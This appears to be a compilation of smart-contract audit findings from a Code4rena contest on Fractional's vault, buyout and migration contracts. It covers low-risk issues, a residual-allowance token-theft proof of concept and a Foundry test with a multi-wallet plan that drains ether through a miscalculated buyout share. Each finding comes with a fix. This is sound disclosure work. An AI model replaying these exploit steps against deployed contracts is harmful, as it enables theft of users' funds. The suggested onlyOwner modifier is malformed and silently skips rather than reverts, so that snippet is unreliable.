re-entrancy attacks in case any attack vector is missed out by C4's wardens during the contest.   A number of key functions within `Buyout` and `Migration` modules deal with ERC1155, which contains a hook that will make a callback to the recipient whenever a transfer occurs, thus increasing the risk of a re-entrancy attack. Refer to the "Lack Of Reentrancy Guards" issue for more details.  Thus, it would be prudent to implement additional reentrancy prevention wherever possible by utilizing the `nonReentrant` modifier from [Openzeppelin Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) to block possible re-entrancy as a defense-in-depth measure.  #### Input Validation  Although input validation has been already implemented in the majority of the functions, it can be further strengthened to thwart potential attacks or prevent unexpected behavior in the future. For instance, `Vault.transferOwnership` does not check if the ownership is being transferred to `address(0)`, which might affect the functionality of the vault.  # 3. Summary Of Findings  The following is a summary of the low and non-critical findings observed during the contest.  | No.  | Title                                                        | Risk Rating  | | ---- | ------------------------------------------------------------ | ------------ | | 4.1  | Lack Of Reentrancy Guards                                    | Low          | | 4.2  | Migration Sequence Not Enforced                              | Low          | | 4.3  | State Variable Visibility Is Not Set                         | Low          | | 4.4  | Risk of Plugins                                              | Low          | | 4.5  | Ether Might Stuck In `Vault.sol`                             | Low          | | 4.6  | Ownership May Be Burned                                      | Low          | | 4.7  | Array Length Not Validated                                   | Low          | | 4.8  | Consider Two-Phase Ownership Transfer                        | Low          | | 4.9  | Migration Proposer Can Hijack Other User's Buyout To Settle A Vault | Low          | | 5.1  | Incorrect Comment                                            | Non-Critical | | 5.2  | Use Modifier For Better Readability And Code Reuse           | Non-Critical | | 5.3  | Assembly Within `Supply.sol` and `Transfer.sol`              | Non-Critical | | 5.4  | Variable Should Be Called `isInit` Instead Of `Nonce`        | Non-Critical |    # 4. Low Risk Issues  ## 4.1   Lack Of Reentrancy Guards  #### Description  Whenever `IERC1155(token).safeTransferFrom` is called, the `to` address can re-enter back to the contracts due to the `ERC1155TokenReceiver(to).onERC1155Received(msg.sender, from, id, amount, data)` code (hook)  https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L55  ```solidity function safeTransferFrom(     address from,     address to,     uint256 id,     uint256 amount,     bytes calldata data ) public virtual {     require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");      balanceOf[from][id] -= amount;     balanceOf[to][id] += amount;      emit TransferSingle(msg.sender, from, to, id, amount);      require(         to.code.length == 0             ? to != address(0)             : ERC1155TokenReceiver(to).onERC1155Received(msg.sender, from, id, amount, data) ==                 ERC1155TokenReceiver.onERC1155Received.selector,         "UNSAFE_RECIPIENT"     ); } ```  The following functions utilise `IERC1155(token).safeTransferFrom` that allows the caller or proposer to re-enter back to the contracts  - [`Buyout.buyFractions`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L149)  - [`Buyout.end`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L184)  - [`Migration.leave`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141)  - [`Migration.withdrawContribution`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L292)  #### Recommendation  Apply necessary reentrancy prevention by utilizing the OpenZeppelin's nonReentrant modifier to block possible re-entrancy.    ## 4.2 Migration Sequence Not Enforced  #### Description  Functions should be called in the following sequence to migrate a vault after a successful buyout.  1. `Migration.settleVault` - Create new vault  2. `Migration.settleFractions` - Mint new fractional tokens to new vault  3. `Migration.migrateFractions` - Give investors the new fractional token  However, a user can call `Migration.settleVault ` follow by `Migration.migrateFractions `, thus skipping the `Migration.settleFractions`.  Although it does not result in any loss of asset, allowing users to call the functions pertaining to migration in an out-of-order manner might cause unintended consequence in the future.  #### Recommendation  After the `Migration.settleFractions` has been executed, the `migrationInfo[_vault][_proposalId].fractionsMigrated` will be set to `true`.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L257  ```solidity function settleFractions(     address _vault,     uint256 _proposalId,     bytes32[] calldata _mintProof ) external {     ..SNIP..     migrationInfo[_vault][_proposalId].fractionsMigrated = true; } ```  Within the `Migration.migrateFractions` function, check that `migrationInfo[_vault][_proposalId].fractionsMigrated == true` to ensure that the `Migration.settleFractions` has been executed.  ```diff function migrateFractions(address _vault, uint256 _proposalId) external { + // Fractional tokens must be minted first before migrating + require(migrationInfo[_vault][_proposalId].fractionsMigrated, "Fractional token not minted yet");     // Reverts if address is not a registered vault     (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);     if (id == 0) revert NotVault(_vault);     // Reverts if buyout state is not successful     (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(         _vault     );     State required = State.SUCCESS;     if (current != required) revert IBuyout.InvalidState(required, current);     // Reverts if proposer of buyout is not this contract     if (proposer != address(this)) revert NotProposalBuyout(); ```    ## 4.3 State Variable Visibility Is Not Set  #### Description  Visibility is not set for the `token` state variable.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L13  ```solidity /// @title Metadata /// @author Fractional Art /// @notice Utility contract for storing metadata of an FERC1155 token contract Metadata {     /// @notice Address of FERC1155 token contract     address immutable token; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/SupplyReference.sol#L12  ```solidity /// @title Supply /// @author Fractional Art /// @notice Reference implementation for the optimized Supply target contract contract SupplyReference is ISupply {     /// @notice Address of VaultRegistry contract     address immutable registry; ```  #### Recommendation  It is best practice to set the visibility of state variables explicitly. The default visibility for "token" is internal. Other possible visibility settings are public and private.    ## 4.4 Risk of Plugins  #### Description  All plugins' functions within the vault can be called by any public user. If the plugins contain any unprotected privileged functions, it can be called by malicious user.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L38  ```solidity /// @dev Callback for handling plugin transactions /// @param _data Transaction data /// @return response Return data from executing plugin // prettier-ignore fallback(bytes calldata _data) external payable returns (bytes memory response) {     address plugin = methods[msg.sig]; // @audit-issue what if we have the diff contract with same function name? Collision?     (,response) = _execute(plugin, _data); } ```  #### Recommendation  Include a warning in the comments or documentation so that the vault owner is aware that any plugin's function added can be called by the public users. Vault owners should ensure that plugin's functions have the necessary access control in place so that only authorised users can trigger the functions.    ## 4.5 Ether Might Stuck In `Vault.sol`  #### Description  If a user accidentally sent ether to the `Vault` contract, the ether will be stuck in the vault with no way to retrieve them.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32  ```solidity /// @dev Callback for receiving Ether when the calldata is empty receive() external payable {} ```  #### Recommendation  Consider if there is a need for the `Vault` contract to receive ethers. Otherwise, remove it.    ## 4.6 Ownership May Be Burned  #### Description  It was observed that the vault owner can transfer the ownership to `address(0)`, which effectively burn the ownership.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93  ```solidity /// @notice Transfers ownership to given account /// @param _newOwner Address of new owner function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```  #### Recommendation  It is recommended to implement a validation check to ensure that the ownership is not transferred to `address(0)`.  ```diff function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender); +   require(_newOwner != 0, "Invalid new owner: address(0)");     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```    ## 4.7 Array Length Not Validated  #### Description  The `Vault.install` function did not validate that the length of `_selectors` and `_plugins` arrays is the same. If the array length is different, it might cause unexpected behavior.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73  ```solidity /// @notice Installs plugin by setting function selector to contract address /// @param _selectors List of function selectors /// @param _plugins Addresses of plugin contracts function install(bytes4[] memory _selectors, address[] memory _plugins)     external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     uint256 length = _selectors.length;     for (uint256 i = 0; i < length; i++) {         methods[_selectors[i]] = _plugins[i];     }     emit InstallPlugin(_selectors, _plugins); }  ```  #### Recommendation  It is recommended to implement validation to ensure that the length of `_selectors` and `_plugins` arrays is the same.  ```diff function install(bytes4[] memory _selectors, address[] memory _plugins)     external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender); +   require(_selectors.length == _plugins.length, "Length of selectors and plugins is not the same");     uint256 length = _selectors.length;     for (uint256 i = 0; i < length; i++) {         methods[_selectors[i]] = _plugins[i];     }     emit InstallPlugin(_selectors, _plugins); } ```    ## 4.8 Consider Two-Phase Ownership Transfer  #### Description  Owner can calls `Vault.transferOwnership` function to transfers the ownership to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a owner.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93  ```solidity /// @notice Transfers ownership to given account /// @param _newOwner Address of new owner function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```  Controller can calls `ERC1155.transferController` function to transfers the controller role to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a controller.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229  ```solidity /// @notice Updates the controller address for the FERC1155 token contract /// @param _newController Address of new controlling entity function transferController(address _newController)     external     onlyController {     if (_newController == address(0)) revert ZeroAddress();     _controller = _newController;     emit ControllerTransferred(_newController); } ```  ### Recommendation  Consider implementing a two step process where the owner or controller nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of admin to fully succeed. This ensures the nominated EOA account is a valid and active account.    ## 4.9 Migration Proposer Can Hijack Other User's Buyout To Settle A Vault  #### Description  `Migration.settleVault` function should only be callable if the buyout initiated by the migration proposal is successful. However, it was observed that it is possible to call `Migration.settleVault` successfully even though the buyout initiated by the migration proposal has failed.  The following aims to demonstrate the issue:  1. Alice (attacker) creates a migration proposal by calling `Migration.propose` function. Then, she calls `Migration.commit` to kick off the buyout process for the migration, and Alice's proposal's `isCommited` is set to `true`. 2. Alice's buyout is unsuccessful. At this point in time, note that Alice's proposal's `isCommited` still remains as `true`, and the vault state reverts back to `State.INACTIVE`. 3. In order for the `Migration.settleVault` function to run successfully, the following three (3) requirements must be met:    - 1st requirement - Proposal must be committed    - 2nd requirement - Vault state must be set to `status.SUCCESS`    - 3rd requirement - `proposal.newVault` must not be initialised, which means that new vault has not been deployed yet 4. If Alice attempts to call `Migration.settleVault` function, it will revert because the vault state is not set to `State.SUCCESS` due to the failed buyout. In summary, her migration proposal meets all the requirements except for the 2nd requirement.  5. Bob decides to buy out the NFTs in the vault, therefore, he calls the `Buyout.start` to kick start the auction. After the buyout period (4 days), the vault pool has more than 51% of the total supply, thus the buyout is successful. 6. Bob proceeds to call the `Buyout.end` to end the auction. Since the buyout is successful, the vault state is set to `State.SUCCESS` now. 7. Alice decided to hijack Bob's buyout. Therefore, immediately after Bob called the `Buyout.end` function, Alice calls the `Migration.settleVault` function.   8. Alice's `Migration.settleVault` function call will succeed this time because the vault state has been set to `status.SUCCESS`.  This attack does not lead to loss of asset. Thus, I'm marking this as "Low". Even though the migration proposal has settled the vault successfully, when Alice calls `Migration.migrateVaultERC[20|721|1155]`, it will revert because the `Buyout.withdrawERC[20|721|1155]` will detect that the caller (`Migration` module) is not the actual auction winner.   However, `Migration.settleVault` function could still be called successfully in a situation where it should be failing, thus it is something to be raised.  #### Recommendation  Ensure that the `Migration.settleVault` can only be called if the buyout initiated by the migration proposal (within `Migration.commit`) has succeeded.    # 5. Non-Critical Issues    ## 5.1 Incorrect Comment  ### Instance #1 - Buyout  #### Description  The comment mentioned that if a pool has more than 51% of the total supply after 4 days, the buyout is successful.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L21  > /// @title Buyout > /// @author Fractional Art > /// @notice Module contract for vaults to hold buyout pools > /// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool. > /// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether. > /// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether. > /// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer  However, based on the actual implementation, the buyout will be successful as long as the pool has more than 50% of the total supply.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L206  ```solidity uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id); // Checks totalSupply of auction pool to determine if buyout is successful or not if (     (tokenBalance * 1000) /         IVaultRegistry(registry).totalSupply(_vault) >     500 )  ```  #### Recommendation  Update the comment to clearly reflect the actual implementation.  ```diff /// @title Buyout /// @author Fractional Art /// @notice Module contract for vaults to hold buyout pools /// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool. /// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether. /// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether. -/// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer +/// - If a pool has more than 50% of the total supply after 4 days, the buyout is successful and the proposer ```  ### Instance #2 - FERC1155  #### Description  The comment mentioned that the `FERC1155.royaltyInfo` function is to set the token royalties. However, the actual implementation is to read the token royalties.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L241  ```solidity /// @notice Sets the token royalties /// @param _id Token ID royalties are being updated for /// @param _salePrice Sale price to calculate the royalty for function royaltyInfo(uint256 _id, uint256 _salePrice)     external     view     returns (address receiver, uint256 royaltyAmount) {     receiver = royaltyAddress[_id];     royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; } ```  #### Recommendation  Update the comment to clearly reflect the actual implementation.  ```diff -/// @notice Sets the token royalties +/// @notice Reads the token royalties /// @param _id Token ID royalties are being updated for /// @param _salePrice Sale price to calculate the royalty for function royaltyInfo(uint256 _id, uint256 _salePrice)     external     view     returns (address receiver, uint256 royaltyAmount) {     receiver = royaltyAddress[_id];     royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; } ```    ## 5.2 Use Modifier For Better Readability And Code Reuse  #### Description  To improve readability and code reuse, a `onlyOwner` modifer can be defined instead of performing a manual conditional check `if (owner != msg.sender) revert NotOwner(owner, msg.sender);` within the following affected functions:  - [`Vault.setMerkleRoot`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86) - [`Vault.transferOwnership`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) - [`Vault.uninstall`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101) - [`Vault.install`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73)  #### Recommendation  It is recommended to define a modifier for access control and use it consistently throughout the codebase.  Following illustrates an example of the changes made to `Vault.setMerkleRoot` function.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86  ```solidity modifier modifier onlyOwner { {   if (owner == msg.sender) {      _;   } } ```  ```diff + function setMerkleRoot(bytes32 _rootHash) external onlyOwner { - function setMerkleRoot(bytes32 _rootHash) external { -    if (owner != msg.sender) revert NotOwner(owner, msg.sender);     merkleRoot = _rootHash; } ```    ## 5.3 Assembly Within `Supply.sol` and `Transfer.sol`  #### Description  The following functions were implemented in assembly:  - [`Supply .mint`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L23) - [`Supply.burn`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L113) - [`Transfer.ERC20Transfer`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L18) - [`Transfer.ERC721TransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L222) - [`Transfer.ERC1155TransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L341) - [`Transfer.ERC1155BatchTransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L474)  Even though assembly code was used for gas optimization, it reduces the readability (and future updatability) of the code.  #### Recommendation  Consider eliminating all assembly code and re-implement them in Solidity to make the code significantly more clean.    ## 5.4 Variable Should Be Called `isInit` Instead Of `Nonce`  **Description**  The purpose of the `nonce` is to ensure that the `Vault.init` function is only called once.  Consider renaming it to `isInit` for better readability.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L24  ```solidity /// @dev Initializes nonce and proxy owner function init() external {     if (nonce != 0) revert Initialized(owner, msg.sender, nonce);     nonce = 1;     owner = msg.sender;     emit TransferOwnership(address(0), msg.sender); } ```
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91   # Vulnerability details  ## Vulnerability Details  A depositor cannot have any residual allowance after depositing to the vault because the tokens can be stolen by anyone.  ## Proof-of-Concept  Assume that Alice has finished deploying the vault, and she would like to deposit her ERC20, ERC721, and ERC1155 tokens to the vault. She currently holds the following assets in her wallet  - `1000` XYZ ERC20 tokens - APE #1 ERC721 NFT, APE #2 ERC721 NFT, APE #3 ERC721 NFT,  - `1000` ABC ERC1155 tokens  Thus, she sets up the necessary approval to grant [`baseVault`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L17) contract the permission to transfer her tokens to the vault.  ```solidity erc20.approve(address(baseVault), type(uint256).max); erc721.setApprovalForAll(address(baseVault), true); erc1155.setApprovalForAll(address(baseVault), true); ```  Alice decided to deposit `50` XYZ ERC20 tokens, APE #1 ERC721 NFT, and `50` ABC tokens to the vault by calling `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` as shown below:  ```solidity baseVault.batchDepositERC20(alice.addr, vault, [XYZ.addr], [50]) baseVault.batchDepositERC721(alice.addr, vault, [APE.addr], [#1]) baseVault.batchDepositERC1155(alice.addr, vault, [ABC.addr], [#1], [50], "") ```  An attacker notices that there is residual allowance left on the `baseVault`, thus the attacker executes the following transactions to steal Alice's assets and send them to the attacker's wallet address.  ```solidity baseVault.batchDepositERC20(alice.addr, attacker.addr, [XYZ.addr], [950]) baseVault.batchDepositERC721(alice.addr, attacker.addr, [APE.addr, APE.addr], [#2, #3]) baseVault.batchDepositERC1155(alice.addr, attacker.addr, [ABC.addr], [#1], [950], "") ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58)  ```solidity function batchDepositERC20(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77)  ```solidity function batchDepositERC721(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91)  ```solidity function batchDepositERC1155(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom(                 _from,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  ## Impact  Lost of assets for users as a malicious user could utilise the `baseVault` contract to exploit the user's residual allowance to steal their assets.  ## Recommended Mitigation Steps  It is recommended to only allow the `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` functions to pull tokens from the caller (`msg.sender`).  Considering updating the affected functions to remove the `from` parameter, and use `msg.sender` instead.  ```diff function batchDepositERC20( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); +       IERC20(_tokens[i]).transferFrom(msg.sender, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC721( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]); +       IERC721(_tokens[i]).safeTransferFrom(msg.sender, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC1155( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom( -               _from, +               msg.sender,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269   # Vulnerability details  ## Impact  The function `Buyout.cash` allows a user to cash out proceeds (Ether) from a successful vault buyout.  However, due to how `buyoutShare` is calculated in `Buyout.cash`, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in `buyoutInfo[_vault].ethBalance`. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the `Buyout` contract.  ## Proof of Concept  Copy paste the following test case into `Buyout.t.sol` and run the test via `forge test -vvv --match-test testCashDrainEther`:  The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in `10 ether`). Alice and Eve are both entitled to receive `5 ether` each. Alice receives the correct amount when cashing out, however, due to a miscalculation of `buyoutShare` (see [#L268-L269](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out `10 ether` from the `Buyout` contract.  ```solidity function testCashDrainEther() public {   /// ==================   /// ===== SETUP =====   /// ==================    deployBaseVault(alice, TOTAL_SUPPLY);   (token, tokenId) = registry.vaultToToken(vault);   alice.ferc1155 = new FERC1155BS(address(0), 111, token);   bob.ferc1155 = new FERC1155BS(address(0), 222, token);   eve.ferc1155 = new FERC1155BS(address(0), 333, token);    buyout = address(buyoutModule);   proposalPeriod = buyoutModule.PROPOSAL_PERIOD();   rejectionPeriod = buyoutModule.REJECTION_PERIOD();    vm.label(vault, "VaultProxy");   vm.label(token, "Token");    setApproval(alice, vault, true);   setApproval(alice, buyout, true);   setApproval(bob, vault, true);   setApproval(bob, buyout, true);   setApproval(eve, vault, true);   setApproval(eve, buyout, true);    alice.ferc1155.safeTransferFrom(       alice.addr,       bob.addr,       1,       6000,       ""   );    alice.ferc1155.safeTransferFrom(       alice.addr,       eve.addr,       1,       2000,       ""   );   /// ==================   /// ===== SETUP END =====   /// ==================    /// Fraction balances:   assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000   assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    bob.buyoutModule.start{value: 10 ether}(vault);    assertEq(getETHBalance(buyout), 10 ether);    /// Bob (proposer of buyout) transfered his fractions to buyout contract   assertEq(getFractionBalance(buyout), 6000);    vm.warp(rejectionPeriod + 1);    bob.buyoutModule.end(vault, burnProof);    /// Fraction balances after buyout ended:   assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000   assertEq(getFractionBalance(bob.addr), 0); // Bob: 0   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    assertEq(getETHBalance(buyout), 10 ether);    /// Alice cashes out 2000 fractions -> 5 ETH (correct amount)   alice.buyoutModule.cash(vault, burnProof);    assertEq(getFractionBalance(alice.addr), 0);   assertEq(getETHBalance(alice.addr), 105 ether);    /// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH   eve.buyoutModule.cash(vault, burnProof); } ```  **Additionally** to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:  1. Attacker deploys a vault with `10.000` fractions minted 2. 51% of fractions (`5.100`) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, `980` fractions each) 3. With the first wallet, the attacker starts a buyout with `10 ether` - fractions are transferred into the `Buyout` contract as well as `10 ether` 4. Attacker waits for `REJECTION_PERIOD` to elapse to call `Buyout.end` (51% of fractions are already held in the contract, therefore no need for voting) 5. After the successful buyout, the attacker uses the `Buyout.cash` function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the `Buyout` contract:    1. Wallet 1 - `buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether` (`totalSupply = 3920` after burning `980` fractions from wallet 1)    2. Wallet 2 - `buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether` (`totalSupply = 2940` after burning `980` fractions from wallet 2)    3. Wallet 3 - `buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether` (`totalSupply = 1960` after burning `980` fractions from wallet 3)    4. Wallet 4 - `buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether` (`totalSupply = 980` after burning `980` fractions from wallet 4)    5. Wallet 5 - `buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether` (`totalSupply = 0` after burning `980` fractions from wallet 5)  If summed up, cashing out the 5 wallets, the attacker receives `22.8 ether` in total. Making a profit of `12.8 ether`.  This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the `Buyout` contract.  ## Tools Used  Manual review  ## Recommended mitigation steps  Decrement `ethBalance` from buyout info `buyoutInfo[_vault].ethBalance -= buyoutShare;` in `Buyout.cash` (see `@audit-info` annotation):  ```solidity function cash(address _vault, bytes32[] calldata _burnProof) external {     // Reverts if address is not a registered vault     (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(         _vault     );     if (id == 0) revert NotVault(_vault);     // Reverts if auction state is not successful     (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);     State required = State.SUCCESS;     if (current != required) revert InvalidState(required, current);     // Reverts if caller has a balance of zero fractional tokens     uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);     if (tokenBalance == 0) revert NoFractions();      // Initializes vault transaction     bytes memory data = abi.encodeCall(         ISupply.burn,         (msg.sender, tokenBalance)     );     // Executes burn of fractional tokens from caller     IVault(payable(_vault)).execute(supply, data, _burnProof);      // Transfers buyout share amount to caller based on total supply     uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     uint256 buyoutShare = (tokenBalance * ethBalance) /         (totalSupply + tokenBalance);     buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement `ethBalance` by `buyoutShare`     _sendEthOrWeth(msg.sender, buyoutShare);     // Emits event for cashing out of buyout pool     emit Cash(_vault, msg.sender, buyoutShare); } ```   
